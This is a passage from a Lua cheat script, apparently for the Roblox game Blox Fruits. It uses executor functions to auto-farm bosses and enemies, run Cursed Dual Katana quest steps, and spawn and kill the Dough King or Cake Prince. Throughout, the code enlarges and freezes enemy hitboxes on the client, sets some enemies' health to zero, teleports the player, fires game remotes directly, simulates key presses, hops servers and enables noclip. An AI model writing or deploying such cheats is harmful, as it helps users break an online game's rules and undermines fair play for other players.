                                            elseif EliteName == "Diablo" then
                                                toTarget(CFrame.new(-11153.138671875, 736.5569458007812, -6851.171875))
                                            end
                                        end
                                    else
                                        v = game:GetService("Workspace").Enemies:FindFirstChild(EliteName)
                                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                            repeat wait()
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                EquipWeapon(_G.SelectWeapon)
                                                v.HumanoidRootPart.Transparency = 1
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            until not _G.AutoYama or v.Humanoid.Health <= 0 or not v.Parent
                                        end
                                    end
                                else
                                    if _G.AutoYamaHop and ReplicatedStorage.Remotes["CommF_"]:InvokeServer("EliteHunter") == "I don't have anything for you right now. Come back later." then
                                        HopServer()
                                    else
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter")
                                    end
                                end
                            else
                                repeat wait(.1)
                                    fireclickdetector(game:GetService("Workspace").Map.Waterfall.SealedKatana.Handle.ClickDetector)
                                until not isWeaponInInventory("Yama") or not _G.AutoYama
                            end
                        end
                    end)
                end
            end)
            function isDoughSpawned()
                if ReplicatedStorage:FindFirstChild("Dough King") or ReplicatedStorage:FindFirstChild("Cake Prince") or game.Workspace.Enemies:FindFirstChild("Dough King") or game.Workspace.Enemies:FindFirstChild("Cake Prince") then
                    return true
                else return false end
            end
            Sea3ItemsSection:NewLabel("")
            leftToSpawnDough = Sea3ItemsSection:NewLabel("Mobs Left to Spawn: Enable Auto Spawn Dough/Cake Boss")
            farmDough = Sea3ItemsSection:NewToggle("Farm Mobs for Spawn", "Farm Mobs for Spawn", function(value)
                getgenv().Settings["Farm Dough"] = value
                WriteSettings()
            end)
            if getgenv().Settings["Farm Dough"] then farmDough:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().Settings["Farm Dough"] and not isDoughSpawned() then
                            _G.FarmDough = true
                        else
                            _G.FarmDough = false
                        end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.FarmDough and not isDoughSpawned() then
                            if not game.Workspace.Enemies:FindFirstChild("Head Baker") or not game.Workspace.Enemies:FindFirstChild("Baking Staff") or not game.Workspace.Enemies:FindFirstChild("Cake Guard") or not game.Workspace.Enemies:FindFirstChild("Cookie Crafter") then
                                if game.ReplicatedStorage:FindFirstChild("Head Baker") or game.ReplicatedStorage:FindFirstChild("Baking Staff") or game.ReplicatedStorage:FindFirstChild("Cake Guard") or game.ReplicatedStorage:FindFirstChild("Cookie Crafter") then
                                    v = game.ReplicatedStorage:FindFirstChild("Head Baker") or game.ReplicatedStorage:FindFirstChild("Baking Staff") or game.ReplicatedStorage:FindFirstChild("Cake Guard") or game.ReplicatedStorage:FindFirstChild("Cookie Crafter")
                                    toPoint(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                else
                                    Portal = CFrame.new(-2145.08032, 116.83345, -12411.7861, -0.178861186, -3.69647889e-11, 0.983874321, -3.58036822e-10, 1, -2.75178456e-11, -0.983874321, -3.57185115e-10, -0.178861186)
                                    toPoint(Portal)
                                end
                            else
                                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                    if v.Name == "Head Baker" or v.Name == "Baking Staff" or v.Name == "Cake Guard" or v.Name == "Cookie Crafter" then
                                        if v.Humanoid.Health > 0 then
                                            seconds = 10
                                            repeat wait()
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Head.CanCollide = false
                                                BringMobFarm = true
                                                EquipWeapon(_G.SelectWeapon)
                                                v.HumanoidRootPart.Transparency = 1
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            until v.Humanoid.Health <= 0 or not _G.FarmDough or isDoughSpawned() or LP.Character.Humanoid.Health <= 0
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end)

            autoSpawnDough = Sea3ItemsSection:NewToggle("Auto Spawn Dough/Cake Boss", "Kill Dough King / Cake Prince", function(value)
                getgenv().Settings["Auto Spawn Dough"] = value
                WriteSettings()
            end)
            if getgenv().Settings["Auto Spawn Dough"] then autoSpawnDough:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().Settings["Auto Spawn Dough"] then
                            if not isDoughSpawned() then
                                if string.len(ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 88 then
                                    leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: "..string.sub(ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,41))
                                elseif string.len(ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 87 then
                                    leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: "..string.sub(ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,40))
                                elseif string.len(ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 86 then
                                    leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: "..string.sub(ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,39))
                                end
                            else
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: 0")
                            end
                        end
                    end)
                end
            end)

            killDough = Sea3ItemsSection:NewToggle("Kill Dough King / Cake Prince", "Kill Dough King / Cake Prince", function(value)
                getgenv().Settings["Kill Dough"] = value
                WriteSettings()
            end)
            if getgenv().Settings["Kill Dough"] then killDough:UpdateToggle(nil, true) end

            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().Settings["Kill Dough"] then
                            if ReplicatedStorage:FindFirstChild("Dough King") and ReplicatedStorage:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                _G.KillDough = true
                            elseif game.Workspace.Enemies:FindFirstChild("Dough King") and game.Workspace.Enemies:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                _G.KillDough = true
                            elseif ReplicatedStorage:FindFirstChild("Cake Prince") and ReplicatedStorage:FindFirstChild("Cake Prince").Humanoid.Health > 0 then
                                _G.KillDough = true
                            elseif game.Workspace.Enemies:FindFirstChild("Cake Prince") and game.Workspace.Enemies:FindFirstChild("Cake Prince").Humanoid.Health > 0 then
                                _G.KillDough = true
                            else
                                _G.KillDough = false
                            end
                        else _G.KillDough = false
                        end
                    end)
                end
            end)
            
            function tpToDoughIfNeed()
                if game.Workspace.Enemies:FindFirstChild("Cake Prince") then v = game.Workspace.Enemies:FindFirstChild("Cake Prince") end 
                if game.Workspace.Enemies:FindFirstChild("Dough King") then v = game.Workspace.Enemies:FindFirstChild("Dough King") end
                if ReplicatedStorage:FindFirstChild("Dough King") then v = ReplicatedStorage:FindFirstChild("Dough King") end
                if ReplicatedStorage:FindFirstChild("Cake Prince") then v = ReplicatedStorage:FindFirstChild("Cake Prince") end
                if getDistance(v.HumanoidRootPart.CFrame) > 3000 then
                    StopTween()
                    firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.CakeLoaf.BigMirror.Main.TouchInterest.Parent, 1) 
                    firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.CakeLoaf.BigMirror.Main.TouchInterest.Parent, 0) 
                    wait(1.5)
                end
            end

            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.KillDough and third_sea then
                            if game.Workspace.Enemies:FindFirstChild("Dough King") or game.Workspace.Enemies:FindFirstChild("Cake Prince") then
                                if game.Workspace.Enemies:FindFirstChild("Dough King") then v = game.Workspace.Enemies:FindFirstChild("Dough King") end 
                                if game.Workspace.Enemies:FindFirstChild("Cake Prince") then v = game.Workspace.Enemies:FindFirstChild("Cake Prince") end 
                                if v:FindFirstChild("HumanoidRootPart") then
                                    if v.Humanoid.Health <= 0 then 
                                        StopTween()
                                    else
                                        if StoppedTween then 
                                            StopTween()
                                            wait(.1)
                                            StoppedTween = false
                                        end
                                        repeat task.wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            tpToDoughIfNeed()
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            v.Humanoid:ChangeState(14)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            RenMon = v.Name
                                            RenPos = v.HumanoidRootPart.CFrame
                                        until not _G.KillDough or not v.Parent or v.Humanoid.Health <= 0 or not LP.Character:FindFirstChild("Humanoid") or LP.Character:FindFirstChild("Humanoid").Health <= 0
                                    end
                                else
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                end
                            elseif ReplicatedStorage:FindFirstChild("Dough King") or ReplicatedStorage:FindFirstChild("Cake Prince") then
                                tpToDoughIfNeed()
                            end
                        end
                    end)
                end
            end)
            
            function EquipSword(SwordName)
                if not LP.Character:FindFirstChild(SwordName) then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadItem",SwordName)
                end
            end
            function getGoodProgress()
                return ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil").Good
            end
            function getEvilProgress()
                return ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil").Evil
            end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().Settings["AutoCDK"] and getEvilProgress() ~= -1 then
                            _G.AutoCDK = true
                        else
                            _G.AutoCDK = false
                        end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoCDK then
                            if not isWeaponInInventory("Cursed Dual Katana") then
                                if GetMaterial("Alucard Fragment") < 6 then
                                    if getEvilProgress() ~= -2 and getEvilProgress() ~= 4 then
                                        if getEvilProgress() == 0 or getEvilProgress() == -3 then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                            QuestYama1 = true
                                            QuestYama2 = false
                                            QuestYama3 = false
                                            QuestTushita1 = false
                                            QuestTushita2 = false
                                            QuestTushita3 = false
                                        elseif getEvilProgress() == 1 or getEvilProgress() == -4 then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                            QuestYama1 = false
                                            QuestYama2 = true
                                            QuestYama3 = false
                                            QuestTushita1 = false
                                            QuestTushita2 = false
                                            QuestTushita3 = false
                                        elseif getEvilProgress() == 2 or getEvilProgress() == -5 then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                            QuestYama1 = false
                                            QuestYama2 = false
                                            QuestYama3 = true
                                            QuestTushita1 = false
                                            QuestTushita2 = false
                                            QuestTushita3 = false
                                        end
                                    elseif getGoodProgress() ~= -2 and getGoodProgress() ~= 3 then
                                        if getGoodProgress() == 0 or getGoodProgress() == -3 then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                            QuestYama1 = false
                                            QuestYama2 = false
                                            QuestYama3 = false
                                            QuestTushita1 = true
                                            QuestTushita2 = false
                                            QuestTushita3 = false
                                        elseif getGoodProgress() == 1 or getGoodProgress() == -4 then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                            QuestYama1 = false
                                            QuestYama2 = false
                                            QuestYama3 = false
                                            QuestTushita1 = false
                                            QuestTushita2 = true
                                            QuestTushita3 = false
                                        elseif getGoodProgress() == 2 or getGoodProgress() == -5 then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                            QuestYama1 = false
                                            QuestYama2 = false
                                            QuestYama3 = false
                                            QuestTushita1 = false
                                            QuestTushita2 = false
                                            QuestTushita3 = true
                                        end
                                    else
                                        QuestYama1 = false
                                        QuestYama2 = false
                                        QuestYama3 = false
                                        QuestTushita1 = false
                                        QuestTushita2 = false
                                        QuestTushita3 = false
                                    end
                                else
                                    QuestYama1 = false
                                    QuestYama2 = false
                                    QuestYama3 = false
                                    QuestTushita1 = false
                                    QuestTushita2 = false
                                    QuestTushita3 = false
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss") then
                                        UnEquip()
                                        v = game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss")
                                        toPoint(v.HumanoidRootPart.CFrame)
                                    else
                                        if getDistance(CFrame.new(-12392.3301, 603.354797, -6594.89355, 0.928977132, -3.93540844e-08, 0.370137095, 6.35983923e-08, 1, -5.32974624e-08, -0.370137095, 7.30522487e-08, 0.928977132)) < 20 then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                            wait(1)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                            wait(1)
                                            wait(1.5)
                                            game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                            wait(1.5)
                                            game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)
                                            local VirtualUser=game:service'VirtualUser'
                                            VirtualUser:CaptureController()
                                            VirtualUser:ClickButton1(Vector2.new(300,300))
                                            toPoint(CFrame.new(-12360.1602, 603.353882, -6551.41504, -0.750425041, -3.16974358e-08, -0.660955548, -1.59063127e-08, 1, -2.98975351e-08, 0.660955548, -1.19224923e-08, -0.750425041))
                                            wait(1.5)
                                            game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                            wait(2)
                                            game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)
                                            wait(2)
                                            toPoint(CFrame.new(-12275.5996, 595.679993, -6543.69824, 0.0486852527, -0.998812199, -0.00202682544, 0.00115537643, -0.00197291397, 0.999997377, -0.99881351, -0.0486874729, 0.00105795218))
                                            wait(3)
                                        else
                                            repeat wait()
                                                toPoint(CFrame.new(-12392.3301, 603.354797, -6594.89355))
                                            until getDistance(CFrame.new(-12392.3301, 603.354797, -6594.89355)) < 30 or LP.Character.Humanoid.Health <= 0
                                        end   
                                    end
                                end
                            end
                        else
                            QuestYama1 = false
                            QuestYama2 = false
                            QuestYama3 = false
                            QuestTushita1 = false
                            QuestTushita2 = false
                            QuestTushita3 = false
                        end
                    end)
                end
            end)
            
            spawn(function()
                while wait() do
                    if QuestYama1 then
                        st, er = pcall(function()
                            if (game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") or ReplicatedStorage:FindFirstChild("Mythological Pirate")) and LP.Character.Humanoid.Health > 0 then
                                v = game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") or ReplicatedStorage:FindFirstChild("Mythological Pirate")
                                toPoint(v.HumanoidRootPart.CFrame)
                                EquipSword("Yama")
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                            else
                                toPoint(CFrame.new(-13451.46484375, 543.712890625, -6961.0029296875))
                            end
                        end)
                        if er then print(er) end
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if QuestYama2 then
                            target = nil
                            for i,v in pairs(LP.QuestHaze:GetChildren()) do
                                if v.Value > 0 then
                                    target = v
                                    break
                                end
                            end
                            if target then
                                if not game:GetService("Workspace").Enemies:FindFirstChild(target.Name) then
                                    if ReplicatedStorage:FindFirstChild(target.Name) then
                                        toPoint(ReplicatedStorage:FindFirstChild(target.Name).HumanoidRootPart.CFrame)
                                    else
                                        for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                            if string.find(v.Name, target.Name) then
                                                toPoint(v.CFrame * OffsetCFrame())
                                                break
                                            end
                                        end
                                    end
                                else
                                    v = game:GetService("Workspace").Enemies:FindFirstChild(target.Name)
                                    repeat wait()
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = true
                                        EquipSword("Yama")
                                        EquipWeapon("Sword")
                                        v.HumanoidRootPart.Transparency = 1
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until v.Humanoid.Health <= 0 or not v:FindFirstChild("HazeESP")
                                end
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)

            spawn(function()
                while wait() do
                    if QuestYama3 then
                        pcall(function()
                            if LP.Backpack:FindFirstChild("Hallow Essence") then         
                                _G.AutoBones = false           
                                tweenToPointAdvanced(game:GetService("Workspace").Map["Haunted Castle"].Summoner.Detection.CFrame)
                            elseif game:GetService("Workspace").Map:FindFirstChild("HellDimension") and game:GetService("Workspace").Map["HellDimension"]:FindFirstChild("Torch1") and getDistance(game:GetService("Workspace").Map["HellDimension"]:FindFirstChild("Torch1").CFrame) < 4000 then
                                repeat wait()
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Hell's Messenger") then
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Cursed Skeleton" or v.Name == "Hell's Messenger" then
                                                repeat wait()
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Humanoid.Health = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = false
                                                    EquipSword("Yama")
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    toPoint(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame * CFrame.new(0,50,0))
                                                until v.Humanoid.Health <= 0
                                            end
                                        end
                                    else
                                        
                                        if not game:GetService("Workspace").Map["HellDimension"].Torch3.ProximityPrompt.Enabled and not game:GetService("Workspace").Map["HellDimension"].Torch2.ProximityPrompt.Enabled and not game:GetService("Workspace").Map["HellDimension"].Torch1.ProximityPrompt.Enabled then
                                            tweenToPointAdvanced(game:GetService("Workspace").Map["HellDimension"].Exit.CFrame)
                                        else
                                            toPoint(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame * CFrame.new(0,50,0))
                                            wait(2)
                                            if game:GetService("Workspace").Map["HellDimension"].Torch1.ProximityPrompt.Enabled then
                                                tweenToPointAdvanced(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame)
                                                wait(1.5)
                                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                                wait(1.5)     
                                                game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)   
                                            end
                                            if game:GetService("Workspace").Map["HellDimension"].Torch2.ProximityPrompt.Enabled then
                                                tweenToPointAdvanced(game:GetService("Workspace").Map["HellDimension"].Torch2.CFrame)
                                                wait(1.5)
                                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                                wait(1.5)     
                                                game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)   
                                            end
                                            if game:GetService("Workspace").Map["HellDimension"].Torch3.ProximityPrompt.Enabled then
                                                tweenToPointAdvanced(game:GetService("Workspace").Map["HellDimension"].Torch3.CFrame)
                                                wait(1.5)
                                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                                wait(1.5)     
                                                game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)   
                                            end
                                        end
                                    end
                                until not _G.AutoCDK or not QuestYama3
                            else
                                if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") or game.ReplicatedStorage:FindFirstChild("Soul Reaper") and not game:GetService("Workspace").Map:FindFirstChild("HellDimension") then
                                    _G.AutoBones = false
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") then
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Soul Reaper" then
                                                if v.Humanoid.Health > 0 then
                                                    repeat wait()
                                                        UnEquip()
                                                        tweenToPointAdvanced(v.HumanoidRootPart.CFrame * CFrame.new(0,0,-2))
                                                    until not _G.AutoCDK or QuestYama3 or game:GetService("Workspace").Map:FindFirstChild("HellDimension")
                                                end
                                            end
                                        end
                                    else
                                        if not game:GetService("Workspace").Map:FindFirstChild("HellDimension") then
                                            tweenToPointAdvanced(CFrame.new(game.ReplicatedStorage:FindFirstChild("Soul Reaper").HumanoidRootPart.CFrame))
                                        end
                                    end
                                else
                                    _G.AutoBones = true
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones","Buy",1,1)
                                end
                            end
                        end)
                    end
                end
            end)
        
            spawn(function() 
                while wait() do
                    if QuestTushita1 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","BoatQuest",workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    if QuestTushita1 then
                        repeat wait()
                            useNearestEntrance(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125))
                            toPoint(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125))
                        until getDistance(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125)) < 20 or not _G.AutoCDK or not QuestTushita1
                        wait(1)
                        repeat wait()
                            useNearestEntrance(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625))
                            toPoint(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625))
                        until getDistance(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625)) < 20 or not _G.AutoCDK or not QuestTushita1
                        wait(1)
                        repeat wait()
                            useNearestEntrance(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875))
                            toPoint(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875))
                        until getDistance(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875)) < 20 or not _G.AutoCDK or not QuestTushita1
                        wait(1)
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    if QuestTushita2 then
                        pcall(function()
                            RaidPos = CFrame.new(-5569.12939, 320.95163, -3037.64575, 0.887919843, -3.36478614e-08, 0.45999819, 5.15359346e-08, 1, -2.63303601e-08, -0.45999819, 4.70856847e-08, 0.887919843)
                            if getDistance(RaidPos) > 500 then
                                repeat wait()
                                    toPoint(RaidPos)
                                until getDistance(RaidPos) < 20
                            end
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if getDistance(v.HumanoidRootPart.CFrame) < 1000 then
                                    repeat wait()
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = true
                                        EquipSword("Tushita")
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until v.Humanoid.Health <= 0 or not v.Parent or not _G.AutoCDK or not QuestTushita2 or LP.Character.Humanoid.Health <= 0
                                end
                            end
                        end)
                    end
                end
            end)

            spawn(function()
                while wait() do
                    if QuestTushita3 then
                        pcall(function()
                            if not game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") then
                                if (game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") and game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen").Humanoid.Health > 0) or (game.ReplicatedStorage:FindFirstChild("Cake Queen") and game.ReplicatedStorage:FindFirstChild("Cake Queen") .Humanoid.Health > 0) then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") then
                                        v = game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen")
                                        repeat wait()
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            EquipSword("Tushita")
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.AutoCDK or not QuestTushita3 or game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") or v.Humanoid.Health <= 0 or not v.Parent or not LP.Character.Humanoid.Health <= 0
                                        StopTween()
                                        wait(2)
                                    else
                                        v = game.ReplicatedStorage:FindFirstChild("Cake Queen")
                                        toPoint(v * OffsetCFrame())
                                    end
                                else
                                    pos = CFrame.new(-715.122131, 399.923676, -11021.1973, 0.975071549, -7.006755e-08, -0.221890613, 7.95295918e-08, 1, 3.37080195e-08, 0.221890613, -5.05146041e-08, 0.975071549)
                                    if getDistance(pos) < 5000 then
                                        HopServer()
                                    else
                                        repeat wait()
                                            toPoint(pos)
                                        until getDistance(pos) < 20 or LP.Character.Humanoid.Health <= 0
                                    end
                                end
                            else
                                repeat wait()
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Heaven's Guardian") then
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Humanoid.Health > 0 and getDistance(v.HumanoidRootPart.CFrame) < 2000 then 
                                                repeat wait()
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Humanoid.Health = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    EquipSword("Tushita")
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    toTarget(CFrame.new(-22567.2402, 5305.12842, 3720.73022, 0.998575151, -8.04404365e-08, -0.053363204, 8.09251617e-08, 1, 6.92278324e-09, 0.053363204, -1.12313456e-08, 0.998575151))
                                                    v.HumanoidRootPart.CFrame = CFrame.new(-22567.2402, 5260.12842, 3720.73022, 0.998575151, -8.04404365e-08, -0.053363204, 8.09251617e-08, 1, 6.92278324e-09, 0.053363204, -1.12313456e-08, 0.998575151)
                                                until not v.Parent or v.Humanoid.Health <= 0
                                            end
                                        end
                                    else
                                        if getDistance(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame) < 4000 then
                                            if game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.ProximityPrompt.Enabled then
                                                tweenToPointAdvanced(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame)
                                                wait(1.5)
                                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                                wait(1.5)     
                                                game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)   
                                            end
                                            if game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.ProximityPrompt.Enabled then
                                                tweenToPointAdvanced(game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.CFrame)
                                                wait(1.5)
                                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                                wait(1.5)     
                                                game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)   
                                            end
                                            if game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.ProximityPrompt.Enabled then
                                                tweenToPointAdvanced(game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.CFrame)
                                                wait(1.5)
                                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                                wait(1.5)     
                                                game:GetService("VirtualInputManager"):SendKeyEvent(false, "E", false, game)   
                                            end
                                            if not game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.ProximityPrompt.Enabled and not game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.ProximityPrompt.Enabled and not game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.ProximityPrompt.Enabled then
                                                tweenToPointAdvanced(game:GetService("Workspace").Map["HeavenlyDimension"].Exit.CFrame)
                                            end
                                        end
                                    end
                                until not _G.AutoCDK or not QuestTushita3 or GetMaterial("Alucard Fragment") == 6
                            end
                        end)
                    end
                end
            end)


        end
        
        local RaidTab = Window:NewTab("Raid")
        local RaidSection = RaidTab:NewSection("Raid")
        spawn(function()
            pcall(function()
                game:GetService("RunService").Stepped:Connect(function()
                    if NoClip or _G.Kaitun then
                        if not LP.Character.Head:FindFirstChild("BodyVelocity") then
                            local ag = Instance.new("BodyVelocity")
                            ag.Velocity = Vector3.new(0, 0, 0)
                            ag.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            ag.P = 9000
                            ag.Parent = LP.Character.Head
                            for r, v in pairs(LP.Character:GetDescendants()) do
                                if v:IsA("BasePart") then
                                    v.CanCollide = false
                                end
                            end
                        end
                        for _, v in pairs(LP.Character:GetDescendants()) do
                            if v:IsA("BasePart") then
                                v.CanCollide = false    
                            end
                        end
                    elseif not NoClip and LP.Character.Head:FindFirstChild("BodyVelocity") then
